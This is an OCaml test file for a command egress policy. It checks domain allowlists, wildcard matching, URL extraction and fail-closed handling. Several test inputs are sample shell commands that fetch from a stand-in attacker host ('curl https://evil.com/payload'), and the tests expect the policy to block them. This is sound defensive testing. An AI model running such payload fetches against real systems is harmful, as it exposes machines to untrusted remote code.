(** P12 egress_policy tests — domain matching, command extraction,
    policy loading, and structured error formatting. *)

open Masc_exec

let test_empty_blocks_outbound () =
  let result = Egress_policy.check_command Egress_policy.empty "curl https://evil.com" in
  match result with
  | Egress_policy.Blocked { attempted; allowed } ->
    assert (attempted = "evil.com");
    assert (allowed = [])
  | Allowed -> assert false
;;

let test_empty_allows_commands_without_urls () =
  let result = Egress_policy.check_command Egress_policy.empty "ls -la /tmp" in
  match result with
  | Egress_policy.Allowed -> ()
  | Blocked _ -> assert false
;;

let test_exact_match_allows () =
  let policy =
    Egress_policy.of_allowed ~source:"(test)" [ "github.com"; "registry.npmjs.org" ]
  in
  assert (Egress_policy.domain_allowed policy "github.com" = true);
  assert (Egress_policy.domain_allowed policy "GITHUB.COM" = true);
  assert (Egress_policy.domain_allowed policy "evil.com" = false)
;;

let test_wildcard_match () =
  let policy = Egress_policy.of_allowed ~source:"(test)" [ "*.github.com" ] in
  assert (Egress_policy.domain_allowed policy "api.github.com" = true);
  assert (Egress_policy.domain_allowed policy "raw.github.com" = true);
  assert (Egress_policy.domain_allowed policy "github.com" = true);
  assert (Egress_policy.domain_allowed policy "notgithub.com" = false)
;;

let test_extract_domains () =
  let domains =
    Egress_policy.extract_domains_from_command
      "curl -s https://api.github.com/repos/ocaml/ocaml/releases | jq .tag_name"
  in
  match domains with
  | [ domain ] -> assert (domain = "api.github.com")
  | _ -> assert false
;;

let test_extract_multiple_domains () =
  let domains =
    Egress_policy.extract_domains_from_command
      "wget http://example.com/file && curl https://other.com/api"
  in
  assert (List.length domains = 2);
  assert (List.mem "example.com" domains);
  assert (List.mem "other.com" domains)
;;

let test_extract_strips_port () =
  let domains =
    Egress_policy.extract_domains_from_command "curl https://localhost:8080/health"
  in
  match domains with
  | [ domain ] -> assert (domain = "localhost")
  | _ -> assert false
;;

let test_extract_no_urls () =
  let domains = Egress_policy.extract_domains_from_command "ls -la /tmp" in
  assert (domains = [])
;;

let test_check_allowed_command () =
  let policy =
    Egress_policy.of_allowed ~source:"(test)" [ "github.com"; "*.npmjs.org" ]
  in
  match Egress_policy.check_command policy "git clone https://github.com/ocaml/ocaml" with
  | Egress_policy.Allowed -> ()
  | Blocked _ -> assert false
;;

let test_check_blocked_command () =
  let policy = Egress_policy.of_allowed ~source:"(test)" [ "github.com" ] in
  match Egress_policy.check_command policy "curl https://evil.com/payload" with
  | Egress_policy.Blocked { attempted; _ } -> assert (attempted = "evil.com")
  | Egress_policy.Allowed -> assert false
;;

let test_blocked_json_format () =
  let policy = Egress_policy.of_allowed ~source:"(test)" [ "github.com" ] in
  let result = Egress_policy.check_command policy "curl https://evil.com" in
  let json = Egress_policy.blocked_to_json result in
  let parsed = Yojson.Safe.from_string json in
  match parsed with
  | `Assoc kv ->
    (match List.assoc_opt "error" kv with
     | Some (`String "egress_blocked") -> ()
     | _ -> assert false);
    (match List.assoc_opt "attempted" kv with
     | Some (`String "evil.com") -> ()
     | _ -> assert false)
  | _ -> assert false
;;

let test_allowed_json_format () =
  let json = Egress_policy.blocked_to_json Egress_policy.Allowed in
  let parsed = Yojson.Safe.from_string json in
  match parsed with
  | `Assoc [ ("ok", `Bool true) ] -> ()
  | _ -> assert false
;;

let test_of_json_string () =
  let policy =
    Egress_policy.of_json_string ~source:"(test)" {| ["github.com", "*.npmjs.org"] |}
  in
  assert (Egress_policy.domain_allowed policy "github.com" = true);
  assert (Egress_policy.domain_allowed policy "registry.npmjs.org" = true);
  assert (Egress_policy.domain_allowed policy "evil.com" = false)
;;

let test_of_json_string_invalid () =
  let policy = Egress_policy.of_json_string ~source:"(test)" "not valid json" in
  (* Fail-closed: empty policy *)
  assert (Egress_policy.to_allowed_domains policy = []);
  match Egress_policy.check_command policy "curl https://evil.com" with
  | Egress_policy.Blocked { attempted; allowed } ->
    assert (attempted = "evil.com");
    assert (allowed = [])
  | Allowed -> assert false
;;

let test_of_json_string_not_array () =
  let policy = Egress_policy.of_json_string ~source:"(test)" {| {"domains": []} |} in
  assert (Egress_policy.to_allowed_domains policy = []);
  match Egress_policy.check_command policy "curl https://evil.com" with
  | Egress_policy.Blocked { attempted; allowed } ->
    assert (attempted = "evil.com");
    assert (allowed = [])
  | Allowed -> assert false
;;

let test_of_json_string_empty_array_blocks_outbound () =
  let policy = Egress_policy.of_json_string ~source:"(test)" "[]" in
  assert (Egress_policy.to_allowed_domains policy = []);
  match Egress_policy.check_command policy "curl https://evil.com" with
  | Egress_policy.Blocked { attempted; allowed } ->
    assert (attempted = "evil.com");
    assert (allowed = [])
  | Allowed -> assert false
;;

let test_of_file_missing_blocks_git_url_command () =
  let path = Filename.temp_file "masc-missing-egress-" ".json" in
  Sys.remove path;
  let policy = Egress_policy.of_file path in
  assert (Egress_policy.to_allowed_domains policy = []);
  match Egress_policy.check_command policy "git clone https://github.com/ocaml/ocaml" with
  | Egress_policy.Blocked { attempted; allowed } ->
    assert (attempted = "github.com");
    assert (allowed = [])
  | Allowed -> assert false
;;

let () =
  test_empty_blocks_outbound ();
  test_empty_allows_commands_without_urls ();
  test_exact_match_allows ();
  test_wildcard_match ();
  test_extract_domains ();
  test_extract_multiple_domains ();
  test_extract_strips_port ();
  test_extract_no_urls ();
  test_check_allowed_command ();
  test_check_blocked_command ();
  test_blocked_json_format ();
  test_allowed_json_format ();
  test_of_json_string ();
  test_of_json_string_invalid ();
  test_of_json_string_not_array ();
  test_of_json_string_empty_array_blocks_outbound ();
  test_of_file_missing_blocks_git_url_command ();
  print_endline "[test_egress_policy] all tests passed"
;;
